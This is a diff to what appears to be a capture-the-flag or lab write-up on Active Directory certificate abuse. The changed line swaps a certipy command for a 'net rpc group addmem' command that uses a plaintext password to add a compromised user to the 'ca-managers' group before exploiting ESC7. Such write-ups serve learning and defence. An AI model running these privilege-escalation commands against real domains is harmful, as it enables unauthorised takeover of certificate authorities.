@@ -231,7 +231,7 @@ Lets look at the CA configuration just to make sure this `ca-managers` group can
 
 Because of the DACL relationship, we can add Simon to the `ca-managers` group with:
 ```
-certipy ca -ca 'intercept-DC01-CA' -add-officer Simon.Bowen -username Simon.Bowen -password 'b0OI_fHO859+Aw' -dc-ip 10.10.239.5
+net rpc group addmem "ca-managers" "Simon.Bowen" -U "INTERCEPT"/"Simon.Bowen"%"b0OI_fHO859+Aw" -S "10.10.239.5"
 ```
 
 Now that Simon is in the `ca-managers` group, all we'll need to do is exploit ESC7, which is also outlined on another one of my blog posts here: https://logan-goins.com/2024-05-04-ADCS/
